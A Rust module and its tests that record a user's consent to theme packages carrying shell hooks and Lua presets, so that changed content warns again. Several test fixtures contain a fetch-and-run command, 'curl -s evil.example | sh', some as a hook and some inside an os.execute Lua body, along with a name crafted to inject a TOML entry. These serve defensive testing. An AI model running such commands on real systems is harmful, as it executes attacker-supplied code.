//! Where the keeper's theme-trust ACCEPTANCES are remembered
//! (`odd/tasks/theme-package-trust.md`, W2c — the keeper's
//! `remember-my-acceptance`).
//!
//! W2's gate asks once per apply and warns every time after that. This
//! store is the other half of the keeper's decision: when he confirms a
//! warning, the content he was shown is recorded under the theme's name,
//! so the NEXT apply of that same content goes through in silence — and a
//! package whose content CHANGED warns again, because its recorded content
//! no longer matches.
//!
//! What is recorded is the report ITSELF, field by field — never a
//! fingerprint. A 64-bit hash is trivially collidable, and the attacker in
//! this scenario has write access to a theme the keeper already accepted:
//! they would add a malicious hook and search for a colliding spelling. A
//! collision-resistant hash would need a new crypto dependency; comparing
//! the recorded content exactly needs none, cannot collide, and leaves an
//! auditable record of what was actually accepted.
//!
//! "The content" means everything that RUNS: a hook's provider, key and
//! command text, and a preset's category, file name AND BODY. The first
//! version of this store keyed presets by name alone, and a dual
//! verification refuted it: the apply copies the preset file as it is on
//! disk and the assembled overlay `dofile`s it, so keeping the name and
//! rewriting the body applied arbitrary Lua in silence. That is why the
//! body is compared, and why the detector reports it.
//!
//! Honest limits, stated here and not pretended elsewhere:
//!
//! - This is a consent gate, not a sandbox. An accepted theme still runs as
//!   the keeper; the store only decides whether the warning appears again.
//! - The store lives in HVE's CACHE dir, so clearing the cache loses every
//!   acceptance. That direction is safe by construction: a lost acceptance
//!   brings the warning back, and nothing here can ever silence a warning it
//!   has no record for.
//! - A store that cannot be read is replaced (never merged) the next time
//!   the keeper accepts something, so an unreadable file costs re-warnings,
//!   not a silent consent. An empty store is never written at all.
//! - The acceptance is keyed by the theme NAME, which the apply already
//!   resolved; it is never joined into a path, so it needs no path rule. A
//!   renamed theme simply warns again.
//! - Consent is recorded by the caller only when an apply actually went
//!   through, so a swallowed re-entry remembers nothing.
//!
//! Contract of this module: `load` NEVER fails the caller and never creates
//! anything (a missing store is simply an empty one), and `save` never
//! writes an empty store, always writes 0600 through a private temporary
//! file it renames into place, and reports its failure instead of panicking.

use std::collections::BTreeMap;
use std::io::Write;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::theme_trust::ThemeTrustReport;

/// File name of the acceptance store inside HVE's cache dir.
pub const STORE_FILE: &str = "theme-trust.toml";

/// Format version written into every store this build writes. A file
/// carrying any other version (or none) is refused AS A WHOLE — a
/// hand-edited or future-format file must never be read as consent.
pub const STORE_VERSION: u32 = 1;

/// The largest store this build will WRITE: half the bound its own reader
/// enforces ([`crate::theme_package::MAX_THEME_FILE_BYTES`], 4 MiB).
///
/// Why the write needs a bound of its own: a writer with no bound and a
/// reader with one is a self-bricking pair. One acceptance could grow the
/// store past the reader's bound, and then EVERY acceptance on the machine
/// was refused as a whole — the keeper re-asked about every theme, and the
/// next confirmation replaced the file with only that entry. Both re-judges
/// of this unit confirmed that defect with measurements (one legal theme,
/// ~104 presets, was enough). Half the reader's bound leaves room for a
/// slightly larger store written by a future build whose reader is the same.
pub const MAX_STORE_BYTES: usize = crate::theme_package::MAX_THEME_FILE_BYTES as usize / 2;

/// Absolute path of the acceptance store on this machine. The cache dir is
/// deliberate: it is where this app already keeps its own state, and losing
/// it costs re-warnings.
pub fn store_path() -> PathBuf {
    crate::config::hve_cache_dir().join(STORE_FILE)
}

/// One remembered hook: the provider directory, the event key and the
/// command text, EXACTLY as the detector reported them.
///
/// These are the store's own types, deliberately not `theme_trust`'s: the
/// detector's structs are display shapes, and a field added there for the
/// warning's benefit must not silently enter the file format and invalidate
/// every acceptance on this machine.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct StoredHook {
    provider: String,
    key: String,
    command: String,
}

/// One remembered preset: its category, its file name and the body the
/// keeper accepted.
///
/// `body` is the reason this store is not keyed by names: the apply copies
/// the preset file as it is ON DISK, so a theme that keeps this name and
/// rewrites the body runs different code. `None` means the scan could not
/// read that file in full — such a report is never stored, and a LIVING
/// report in that state can never equal a stored one.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct StoredPreset {
    category: String,
    file_name: String,
    body: Option<String>,
}

/// The content of one acceptance: every field of the report that can
/// execute, in the report's own deterministic order, so two reports compare
/// equal exactly when they carry the same executable content.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct Accepted {
    hooks: Vec<StoredHook>,
    presets: Vec<StoredPreset>,
}

impl Accepted {
    /// The acceptance for one report. Total: any report converts, including
    /// an empty one (the caller never stores that; see
    /// [`TrustStore::remember`]).
    fn from_report(report: &ThemeTrustReport) -> Self {
        Self {
            hooks: report
                .shell_hooks
                .iter()
                .map(|h| StoredHook {
                    provider: h.provider.clone(),
                    key: h.key.clone(),
                    command: h.command.clone(),
                })
                .collect(),
            presets: report
                .lua_presets
                .iter()
                .map(|p| StoredPreset {
                    category: p.category.clone(),
                    file_name: p.file_name.clone(),
                    body: match &p.body {
                        crate::theme_trust::PresetBody::Text(text) => Some(text.clone()),
                        crate::theme_trust::PresetBody::Unreadable(_) => None,
                    },
                })
                .collect(),
        }
    }
}

/// The store file on disk.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
struct StoreFile {
    version: u32,
    accepted: BTreeMap<String, Accepted>,
}

/// The acceptances this machine remembers, in memory.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct TrustStore {
    accepted: BTreeMap<String, Accepted>,
}

impl TrustStore {
    /// Read the store at `path`.
    ///
    /// TOTAL and best-effort by contract: every failure — the file missing,
    /// unreadable, over the read bound, not UTF-8, not TOML, carrying an
    /// unknown version, or not a regular file at all — yields an EMPTY store
    /// and never panics, so the caller has no error to handle and no way to
    /// turn a broken store into a silent consent. Only the missing file is
    /// silent; every other refusal is logged, because the keeper deserves to
    /// know why the warning he thought he had answered is back.
    pub fn load(path: &Path) -> Self {
        // The one failure the keeper is not told about: a first run. Any
        // other refusal means he answered a warning that is now back, so it
        // is logged.
        let missing = !path.exists();
        // THE bounded, regular-file-guarded reader the rest of this app uses
        // for untrusted files, so this store inherits its 4 MiB per-file
        // bound, its "a FIFO is refused instead of opened" predicate and its
        // single error type — no second set of limits to keep in step.
        let raw = match crate::theme_package::read_theme_text(path) {
            Ok(raw) => raw,
            Err(e) => {
                if !missing {
                    tracing::warn!(
                        "[theme-trust] {} could not be read ({}); nothing is remembered, so every theme warns again",
                        path.display(),
                        e
                    );
                }
                return Self::default();
            }
        };
        match toml::from_str::<StoreFile>(&raw) {
            Ok(file) if file.version == STORE_VERSION => Self {
                accepted: file.accepted,
            },
            Ok(file) => {
                tracing::warn!(
                    "[theme-trust] {} carries store format version {} and this build writes {}; nothing is remembered, so every theme warns again",
                    path.display(),
                    file.version,
                    STORE_VERSION
                );
                Self::default()
            }
            Err(e) => {
                tracing::warn!(
                    "[theme-trust] {} is not a readable store ({}); nothing is remembered, so every theme warns again",
                    path.display(),
                    e
                );
                Self::default()
            }
        }
    }

    /// Whether the keeper has already accepted EXACTLY this content for
    /// `name`. A theme nobody accepted, and a report whose every field does
    /// not match the recorded one, both answer `false` — the direction that
    /// shows the warning.
    pub fn accepts(&self, name: &str, report: &ThemeTrustReport) -> bool {
        match self.accepted.get(name) {
            Some(accepted) => *accepted == Accepted::from_report(report),
            None => false,
        }
    }

    /// Record the keeper's acceptance of `report` for `name`.
    ///
    /// Three reports are never remembered, and all for the same reason — a
    /// record that can go stale, or that a store cannot afford, silences a
    /// warning nobody answered:
    ///
    /// - A report carrying NOTHING: a clean package applies without a warning
    ///   whatever this store says.
    /// - A report that is not fully INSPECTED
    ///   ([`ThemeTrustReport::is_uninspected`]): a file nobody could read can
    ///   change inside without the report changing, so remembering it would
    ///   let a rewritten package apply on consent given to something else.
    /// - A report over [`crate::theme_trust::MAX_REMEMBERED_THEME_BYTES`]: a
    ///   theme this store cannot afford is a theme whose decision is not
    ///   remembered, and the warning says so rather than promising a silence
    ///   that will not come.
    ///
    /// The keeper is asked again instead in all three cases.
    pub fn remember(&mut self, name: &str, report: &ThemeTrustReport) {
        if report.is_empty()
            || report.is_uninspected()
            || report.remembered_bytes(name) > crate::theme_trust::MAX_REMEMBERED_THEME_BYTES
        {
            return;
        }
        self.accepted
            .insert(name.to_string(), Accepted::from_report(report));
    }

    /// Write the store to `path`.
    ///
    /// An EMPTY store is never written: the caller's load may have failed on
    /// a file it could not read, and replacing that file with nothing would
    /// throw away acceptances this process never saw. Any other failure is
    /// returned, so the caller can log it — a store that could not be written
    /// only means the warning comes back.
    pub fn save(&self, path: &Path) -> std::io::Result<()> {
        if self.accepted.is_empty() {
            return Ok(());
        }
        let file = StoreFile {
            version: STORE_VERSION,
            accepted: self.accepted.clone(),
        };
        let body = toml::to_string(&file).map_err(std::io::Error::other)?;

        // The write bound, and it REFUSES instead of writing something its
        // own reader would throw away: the file on disk keeps every
        // acceptance already in it, and only this new one is lost (the
        // caller logs it and the warning comes back, which is the safe
        // direction).
        if body.len() > MAX_STORE_BYTES {
            return Err(std::io::Error::other(format!(
                "the store would be {} bytes, over the {MAX_STORE_BYTES}-byte bound this build \
                 writes; the file on disk is left as it is, so the acceptances already in it \
                 survive and only this one is not remembered",
                body.len()
            )));
        }

        // The cache dir is not guaranteed to exist: the store must not depend
        // on the log layer having run first.
        if let Some(parent) = path.parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)?;
            }
        }

        // A private temporary file in the SAME directory, then renamed into
        // place. `fs::write` would have two defects here: it FOLLOWS a
        // symlink at the store path and writes through it, and a store
        // observed mid-write is a store. `create_new` is O_EXCL, so a
        // pre-planted file or symlink at the temporary name cannot be
        // followed either; the rename then REPLACES whatever sits at the
        // store path (the link itself, never its target).
        let tmp = unique_tmp_path(path);
        match write_private(&tmp, body.as_bytes()) {
            Ok(()) => match std::fs::rename(&tmp, path) {
                Ok(()) => Ok(()),
                Err(e) => {
                    let _ = std::fs::remove_file(&tmp);
                    Err(e)
                }
            },
            Err(e) => {
                let _ = std::fs::remove_file(&tmp);
                Err(e)
            }
        }
    }
}

/// Write `body` to a fresh file at `tmp` with mode exactly 0600.
fn write_private(tmp: &Path, body: &[u8]) -> std::io::Result<()> {
    use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(tmp)?;
    // `mode` applies only when the file is CREATED and the umask still masks
    // it, so this explicit call is what makes 0600 certain (the W8 rule, for
    // the same reason).
    file.set_permissions(std::fs::Permissions::from_mode(0o600))?;
    file.write_all(body)?;
    Ok(())
}

/// A temporary file name next to `path`, unique per process and per call, so
/// two concurrent saves cannot collide.
fn unique_tmp_path(path: &Path) -> PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let base = path
        .file_name()
        .map(|f| f.to_string_lossy().to_string())
        .unwrap_or_else(|| STORE_FILE.to_string());
    path.with_file_name(format!("{base}.tmp.{}.{}", std::process::id(), nanos))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::theme_trust::{LuaPreset, ShellHook};
    use std::os::unix::fs::PermissionsExt;

    /// The shape a risky theme produces: one hook the provider runs on its
    /// `started` event, plus one preset the overlay would read and run.
    const ACCEPTED_PRESET_BODY: &str = "-- accepted body\n";

    fn risky_report() -> ThemeTrustReport {
        ThemeTrustReport {
            shell_hooks: vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "sddm-watch.sh".into(),
            }],
            lua_presets: vec![LuaPreset {
                category: "animations".into(),
                file_name: "Space.lua".into(),
                body: crate::theme_trust::PresetBody::Text(ACCEPTED_PRESET_BODY.into()),
            }],
        }
    }

    /// A store holding one acceptance for `Risky`, written where `dir` says.
    fn saved_store(dir: &Path) -> PathBuf {
        let path = dir.join(STORE_FILE);
        let mut store = TrustStore::default();
        store.remember("Risky", &risky_report());
        store.save(&path).unwrap();
        path
    }

    // ── the round trip, and what "the same content" means (S1, S2) ────

    /// W2c spec S1/S2: the content the keeper accepted survives a save and a
    /// load, and the very same content is then answered from the store.
    #[test]
    fn an_accepted_content_is_remembered_across_a_save_and_a_load() {
        let tmp = tempfile::tempdir().unwrap();
        let path = saved_store(tmp.path());

        let store = TrustStore::load(&path);
        assert!(
            store.accepts("Risky", &risky_report()),
            "the recorded content must be recognised after a round trip"
        );
    }

    /// W2c spec S1/S3: EVERY field of the report takes part in the
    /// comparison. Any one of them changing is a different package, so the
    /// warning must come back.
    #[test]
    fn every_field_of_the_report_is_part_of_the_acceptance() {
        let tmp = tempfile::tempdir().unwrap();
        let path = saved_store(tmp.path());
        let store = TrustStore::load(&path);

        let hook = |key: &str, command: &str, provider: &str| ThemeTrustReport {
            shell_hooks: vec![ShellHook {
                provider: provider.into(),
                key: key.into(),
                command: command.into(),
            }],
            lua_presets: risky_report().lua_presets,
        };
        let preset = |category: &str, file_name: &str, body: &str| ThemeTrustReport {
            shell_hooks: risky_report().shell_hooks,
            lua_presets: vec![LuaPreset {
                category: category.into(),
                file_name: file_name.into(),
                body: crate::theme_trust::PresetBody::Text(body.into()),
            }],
        };
        const BODY: &str = ACCEPTED_PRESET_BODY;

        for (what, changed) in [
            (
                "the command",
                hook("started", "curl -s evil.example | sh", "noctalia-v5"),
            ),
            (
                "the event key",
                hook("shutdown", "sddm-watch.sh", "noctalia-v5"),
            ),
            ("the provider", hook("started", "sddm-watch.sh", "other-v1")),
            ("the preset file", preset("animations", "Evil.lua", BODY)),
            ("the preset category", preset("borders", "Space.lua", BODY)),
            // The BLOCKER the dual verification refuted: the BODY is part of
            // the acceptance, because the apply copies this file as it is on
            // disk and the overlay runs it. Same name, same category, other
            // code — a different package.
            (
                "the preset body",
                preset(
                    "animations",
                    "Space.lua",
                    "os.execute(\"curl -s evil.example | sh\")\n",
                ),
            ),
        ] {
            assert!(
                !store.accepts("Risky", &changed),
                "changing {what} makes a different package: the warning must come back"
            );
        }

        // A package that gained a hook, or lost the one it had, is not the
        // accepted package either — the empty and the doubled lists both
        // differ from the recorded one.
        let mut extra = risky_report();
        extra.shell_hooks.push(ShellHook {
            provider: "noctalia-v5".into(),
            key: "colors_changed".into(),
            command: "curl -s evil.example | sh".into(),
        });
        assert!(
            !store.accepts("Risky", &extra),
            "an ADDED hook must warn: that is the exact attack this store closes"
        );
        let mut removed = risky_report();
        removed.shell_hooks.clear();
        assert!(
            !store.accepts("Risky", &removed),
            "a removed hook is not the accepted content"
        );

        // Order is part of the recorded shape: the detector is deterministic,
        // so a reordered report means the file on disk was rewritten.
        let mut swapped = risky_report();
        swapped.shell_hooks.push(ShellHook {
            provider: "noctalia-v5".into(),
            key: "shutdown".into(),
            command: "true".into(),
        });
        let mut swapped_twice = swapped.clone();
        swapped_twice.shell_hooks.swap(0, 1);
        let mut store_two = TrustStore::default();
        store_two.remember("Risky", &swapped);
        assert!(
            !store_two.accepts("Risky", &swapped_twice),
            "a reordered report is not the accepted one"
        );
    }

    /// The multi-line spelling that cost this contract three verification
    /// rounds: a command may end in a newline, and the file format must not
    /// lose it — a lost trailing newline would compare equal to a DIFFERENT
    /// command.
    #[test]
    fn a_command_with_a_trailing_newline_round_trips_exactly() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let multi = ThemeTrustReport {
            shell_hooks: vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "started".into(),
                command: "echo one\necho two\n".into(),
            }],
            lua_presets: Vec::new(),
        };
        let mut store = TrustStore::default();
        store.remember("Risky", &multi);
        store.save(&path).unwrap();

        let loaded = TrustStore::load(&path);
        assert!(
            loaded.accepts("Risky", &multi),
            "a multi-line command must survive the file format byte for byte"
        );
        let mut trimmed = multi.clone();
        trimmed.shell_hooks[0].command = "echo one\necho two".into();
        assert!(
            !loaded.accepts("Risky", &trimmed),
            "the trailing newline is part of the command and must not be dropped"
        );
    }

    /// W2c spec S1: an acceptance belongs to ONE theme. Another theme with
    /// the same content is still a theme nobody accepted.
    #[test]
    fn an_acceptance_is_per_theme() {
        let tmp = tempfile::tempdir().unwrap();
        let path = saved_store(tmp.path());
        let store = TrustStore::load(&path);

        assert!(
            !store.accepts("Other", &risky_report()),
            "an acceptance must not leak to another theme"
        );
        assert!(store.accepts("Risky", &risky_report()));
    }

    /// W2c spec S5: a package carrying nothing is never remembered — its
    /// apply path does not consult the store at all, so an entry for it could
    /// only go stale. An empty store is never written either.
    #[test]
    fn a_clean_report_is_never_remembered() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let mut store = TrustStore::default();
        store.remember("Plain", &ThemeTrustReport::default());
        assert!(!store.accepts("Plain", &ThemeTrustReport::default()));

        store.save(&path).unwrap();
        assert!(
            !path.exists(),
            "an empty store must not create a file: there is nothing to remember"
        );
    }

    /// W2c spec S1: a package HVE could NOT inspect is never remembered. A
    /// file nobody read can change inside without the report changing, so a
    /// record of it would let rewritten content apply on consent given to a
    /// description. The keeper is asked again — and the warning's copy says
    /// so, because it is told the same rule.
    #[test]
    fn a_report_that_could_not_be_inspected_is_never_remembered() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let uninspected = ThemeTrustReport {
            shell_hooks: vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: crate::theme_trust::UNINSPECTED_HOOK_KEY.into(),
                command: "the settings file /nowhere/settings.toml could not be inspected by this scan: /nowhere/settings.toml is not a regular file; it may carry shell commands that are not listed here".into(),
            }],
            lua_presets: Vec::new(),
        };
        assert!(
            uninspected.is_uninspected() && !uninspected.is_empty(),
            "the fixture must be a warning-shaped report that was not inspected"
        );

        let mut store = TrustStore::default();
        store.remember("Opaque", &uninspected);
        assert!(!store.accepts("Opaque", &uninspected));
        store.save(&path).unwrap();
        assert!(
            !path.exists(),
            "an uninspected report must leave no record at all"
        );
    }

    /// The BLOCKER the W2c dual verification refuted, as a first-class test:
    /// the acceptance must cover a preset's BODY, because the body is what
    /// runs — the apply copies the file as it is ON DISK and `overlay.lua`
    /// `dofile`s it, so a theme that keeps its preset NAMES and rewrites
    /// their content used to apply in silence.
    #[test]
    fn rewriting_a_preset_body_makes_it_a_different_acceptance() {
        let tmp = tempfile::tempdir().unwrap();
        let theme = tmp.path().join("Risky");
        let presets = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        std::fs::create_dir_all(&presets).unwrap();
        let lua = presets.join("Space.lua");
        std::fs::write(&lua, "-- innocent body\n").unwrap();

        let accepted = crate::theme_trust::inspect_theme_package(&theme);
        assert!(
            !accepted.is_empty(),
            "the fixture must carry something executable"
        );
        let mut store = TrustStore::default();
        store.remember("Risky", &accepted);
        assert!(store.accepts("Risky", &accepted));

        // SAME name, SAME category, different payload.
        std::fs::write(&lua, "os.execute(\"curl -s evil.example | sh\")\n").unwrap();
        let rewritten = crate::theme_trust::inspect_theme_package(&theme);
        assert_eq!(
            rewritten.lua_presets.len(),
            accepted.lua_presets.len(),
            "the rewrite must keep the same preset NAMES, or this test proves nothing"
        );
        assert!(
            rewritten.lua_presets[0].file_name == accepted.lua_presets[0].file_name,
            "same file name is the whole point: the payload is what changed"
        );
        assert!(
            !store.accepts("Risky", &rewritten),
            "a rewritten preset BODY is a different package: the warning must come back"
        );
    }

    /// The defect BOTH re-judges confirmed, as a first-class test: ONE legal
    /// theme must not be able to write a store that this process's own reader
    /// refuses. Before the report budget, 260 presets at the cap were enough
    /// (a real package bound allows them), and the store was then thrown away
    /// AS A WHOLE on every later read — every acceptance forgotten, and the
    /// next confirmation replacing the file with only that entry.
    ///
    /// The accumulated case across MANY themes is
    /// `an_over_bound_write_is_refused_and_the_old_file_survives`.
    #[test]
    fn one_theme_cannot_write_a_store_its_own_reader_refuses() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        // A theme a REAL package bound allows: 4 MiB per file, 64 MiB total.
        let theme = tmp.path().join("Huge");
        let dir = theme
            .join(crate::theme_presets::PRESETS_DIR)
            .join("animations");
        std::fs::create_dir_all(&dir).unwrap();
        for i in 0..260 {
            std::fs::write(dir.join(format!("p{i:03}.lua")), "x".repeat(16 * 1024)).unwrap();
        }

        let report = crate::theme_trust::inspect_theme_package(&theme);
        assert!(
            !report.is_empty(),
            "the fixture must carry the presets it claims"
        );
        assert_eq!(
            report.lua_presets.len(),
            260,
            "and it must still be NAMED whole: the budget caps what is read, not what is reported"
        );
        assert!(
            report.remembered_bytes("Huge") <= crate::theme_trust::MAX_REMEMBERED_THEME_BYTES,
            "one theme must not be able to ask a store for megabytes — it asked for {}",
            report.remembered_bytes("Huge")
        );

        let mut store = TrustStore::default();
        store.remember("Huge", &report);
        store.save(&path).unwrap();
        assert!(
            !path.exists(),
            "a theme over the budget is never remembered, so nothing is written at all"
        );
        assert!(
            TrustStore::load(&path).accepts("Huge", &report) == false,
            "and it must never answer 'accepted' for it"
        );
    }

    /// W2c-c: a report over the theme budget is never remembered. The
    /// direction is the safe one — the keeper is asked again — and this is
    /// what keeps ONE theme from asking a store to remember megabytes.
    #[test]
    fn a_report_over_the_theme_budget_is_never_remembered() {
        let mut report = risky_report();
        report.shell_hooks[0].command =
            "x".repeat(crate::theme_trust::MAX_REMEMBERED_THEME_BYTES + 1);
        assert!(report.remembered_bytes("Big") > crate::theme_trust::MAX_REMEMBERED_THEME_BYTES);
        assert!(
            !report.is_uninspected(),
            "the fixture is fully read: it is only too large to record"
        );

        let mut store = TrustStore::default();
        store.remember("Big", &report);
        assert!(
            !store.accepts("Big", &report),
            "nothing is remembered for it"
        );
    }

    /// W2c-c, and the defect BOTH re-judges measured: the write is REFUSED
    /// when the store would pass the bound its own reader enforces, and the
    /// file already on disk keeps every acceptance in it. Before this bound,
    /// one acceptance could brick the store for all of them.
    #[test]
    fn an_over_bound_write_is_refused_and_the_old_file_survives() {
        let tmp = tempfile::tempdir().unwrap();
        let path = saved_store(tmp.path());
        let before = std::fs::read_to_string(&path).unwrap();
        assert!(TrustStore::load(&path).accepts("Risky", &risky_report()));

        // Many themes, each INSIDE its own budget, together over the store's.
        let mut store = TrustStore::load(&path);
        // Each theme INSIDE its own budget (a 100 KiB body plus the
        // entry's names and overhead), together over the store's.
        let body = "y".repeat(100 * 1024);
        for i in 0..24 {
            let report = ThemeTrustReport {
                shell_hooks: Vec::new(),
                lua_presets: vec![LuaPreset {
                    category: "animations".into(),
                    file_name: format!("p{i}.lua"),
                    body: crate::theme_trust::PresetBody::Text(body.clone()),
                }],
            };
            store.remember(&format!("Theme{i}"), &report);
        }

        let err = store
            .save(&path)
            .expect_err("a store over its own write bound must not be written");
        assert!(
            err.to_string().contains("over the"),
            "the refusal must say why, got: {err}"
        );
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            before,
            "the store already on disk must keep every acceptance it holds"
        );
        assert!(
            TrustStore::load(&path).accepts("Risky", &risky_report()),
            "and it must still be readable, which is the whole point of the bound"
        );
    }

    /// The defect the W2c-d verification refuted, as a first-class test: the
    /// theme NAME is a field the store writes — once per entry, because the
    /// serializer repeats it in every table header
    /// (`[[accepted."<name>".presets]]`) — and it escaped the budget. A theme
    /// with a long name could therefore be inside every rule the warning's
    /// copy reads and still be refused by the store, so the copy promised a
    /// silence that never came.
    #[test]
    fn a_report_the_rule_accepts_is_one_the_store_writes() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        // A legal Linux directory name: 255 control bytes, which the store
        // escapes at six characters each, in EVERY entry's header.
        let name = "\u{1}".repeat(255);
        let report_with = |count: usize| ThemeTrustReport {
            shell_hooks: Vec::new(),
            lua_presets: (0..count)
                .map(|i| LuaPreset {
                    category: "animations".into(),
                    file_name: format!("{i}.lua"),
                    body: crate::theme_trust::PresetBody::Text(String::new()),
                })
                .collect(),
        };

        // With 80 entries the name still fits the budget: the rule accepts it,
        // so the store must WRITE it.
        let accepted = report_with(80);
        assert!(
            !accepted.is_uninspected(),
            "the fixture is fully read: nothing about it is unknown"
        );
        assert!(
            accepted.remembered_bytes(&name) <= crate::theme_trust::MAX_REMEMBERED_THEME_BYTES,
            "the fixture must be inside the budget, got {}",
            accepted.remembered_bytes(&name)
        );
        let mut store = TrustStore::default();
        store.remember(&name, &accepted);
        assert!(store.accepts(&name, &accepted));
        store
            .save(&path)
            .expect("a report the RULE accepts must be one the store can write");
        let written = std::fs::metadata(&path).unwrap().len();
        assert!(
            written <= crate::theme_package::MAX_THEME_FILE_BYTES,
            "and the file it writes must stay readable by its own reader: wrote {written}"
        );

        // The SAME shape with more entries is refused by the RULE, so the
        // warning never promises the silence the store would refuse.
        let too_many = report_with(1_348);
        assert!(
            too_many.remembered_bytes(&name) > crate::theme_trust::MAX_REMEMBERED_THEME_BYTES,
            "the name the store repeats in every entry must be counted — it counted {}",
            too_many.remembered_bytes(&name)
        );
        assert!(
            !crate::trust_acceptance_can_be_remembered(&too_many, &name),
            "and the rule the copy reads must refuse it, not only the store"
        );
        let mut store = TrustStore::default();
        store.remember(&name, &too_many);
        assert!(
            !store.accepts(&name, &too_many),
            "nothing is remembered for it"
        );
    }

    /// A theme name is a TOML key here and is NEVER joined into a path, so
    /// any name the apply can resolve must round trip — including one that
    /// needs quoting, and one that would FORGE A SECOND ENTRY if the
    /// serializer escaped it wrongly. The fixture name carries a newline, a
    /// bracket, a quote and a backslash on purpose: a name is untrusted text
    /// from a theme directory, and a store an attacker can rewrite by naming
    /// a theme cleverly would silence a warning for a DIFFERENT theme.
    #[test]
    fn a_theme_name_that_needs_quoting_round_trips() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let name = "Mi Tema \"raro\"\\\t(2026)\n[accepted.Other]\nversion = 1";
        // The neighbour carries DIFFERENT content on purpose: if the
        // look-alike name could write another theme's acceptance, this is
        // what would expose it — an entry answered for content nobody
        // accepted.
        let other = ThemeTrustReport {
            shell_hooks: vec![ShellHook {
                provider: "noctalia-v5".into(),
                key: "shutdown".into(),
                command: "something-else.sh".into(),
            }],
            lua_presets: Vec::new(),
        };
        let mut store = TrustStore::default();
        store.remember(name, &risky_report());
        store.remember("Other", &other);
        store.save(&path).unwrap();

        let loaded = TrustStore::load(&path);
        assert!(
            loaded.accepts(name, &risky_report()),
            "a quoted name must round trip"
        );
        assert!(
            loaded.accepts("Other", &other),
            "the neighbour entry must survive too"
        );
        assert!(
            !loaded.accepts("Other", &risky_report()),
            "a name that LOOKS like TOML must never write another theme's content"
        );
        assert_eq!(
            loaded.accepted.len(),
            2,
            "two themes must stay two entries, got:\n{}",
            std::fs::read_to_string(&path).unwrap()
        );
    }

    /// `save` must be able to create its own directory: the cache dir is not
    /// guaranteed to exist, and the store must not depend on the log layer
    /// having run first.
    #[test]
    fn save_creates_the_parent_directory() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("hve").join("deeper").join(STORE_FILE);
        let mut store = TrustStore::default();
        store.remember("Risky", &risky_report());
        store.save(&path).unwrap();
        assert!(path.is_file());
    }

    // ── every failure degrades to "nothing remembered" (S7) ──────────

    /// A first run: the store does not exist. Loading it is silent, empty,
    /// and creates nothing.
    #[test]
    fn a_missing_store_loads_empty_and_creates_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        let store = TrustStore::load(&path);
        assert!(!store.accepts("Risky", &risky_report()));
        assert!(!path.exists(), "loading a store must never create one");
    }

    /// A file that is not TOML is refused as a whole: refusing the document
    /// is the direction that shows the warning again.
    #[test]
    fn a_store_that_is_not_toml_is_refused_as_a_whole() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        std::fs::write(&path, "this is not a store {{{").unwrap();
        assert!(!TrustStore::load(&path).accepts("Risky", &risky_report()));
    }

    /// A store from a future (or unknown) format must never be read as
    /// consent: the shape of an acceptance may have changed.
    #[test]
    fn a_store_with_an_unknown_version_is_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        std::fs::write(
            &path,
            format!(
                "version = {}\n\n[accepted.Risky]\nhooks = [{{ provider = \"noctalia-v5\", key = \"started\", command = \"sddm-watch.sh\" }}]\npresets = []\n",
                STORE_VERSION + 1
            ),
        )
        .unwrap();
        assert!(!TrustStore::load(&path).accepts("Risky", &risky_report()));
    }

    /// A hand-written store with no version marker is refused too: the
    /// version is REQUIRED, so a missing one is a mistake, not a default.
    #[test]
    fn a_store_without_a_version_is_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
        std::fs::write(
            &path,
            "[accepted.Risky]\nhooks = [{ provider = \"noctalia-v5\", key = \"started\", command = \"sddm-watch.sh\" }]\npresets = []\n",
        )
        .unwrap();
        assert!(!TrustStore::load(&path).accepts("Risky", &risky_report()));
    }

    /// An unreadable store (no permission) is not a crash and not a silent
    /// consent: it is an empty store, and the caller can still accept again.
    #[test]
    fn an_unreadable_store_degrades_to_nothing_remembered() {
        let tmp = tempfile::tempdir().unwrap();
        let path = saved_store(tmp.path());
        assert!(TrustStore::load(&path).accepts("Risky", &risky_report()));

        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();
        assert!(
            !TrustStore::load(&path).accepts("Risky", &risky_report()),
            "a store this process cannot read must never answer 'accepted'"
        );
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).unwrap();
    }

    /// An over-bound store is refused by the SAME bounded reader every other
    /// untrusted file in this app goes through, even when it parses: the
    /// bound is what keeps a huge file from being read into memory at all.
    #[test]
    fn an_oversized_store_is_refused() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join(STORE_FILE);
